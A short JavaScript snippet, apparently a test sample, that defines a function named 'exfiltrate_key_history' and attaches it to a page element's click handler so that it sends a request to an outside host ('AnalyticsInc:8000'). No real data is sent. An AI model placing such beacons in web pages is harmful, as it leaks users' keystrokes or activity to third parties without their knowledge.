function exfiltrate_key_history() {
  newreq = XMLHttpRequest;
  xmlhttp = new newreq;
  xmlhttp.open("GET", "http://AnalyticsInc:8000/submission.html?test=clone4", true);
  xmlhttp.send(null);
  return;
}
var v0 = document.getElementById("test");
v0.onclick = exfiltrate_key_history
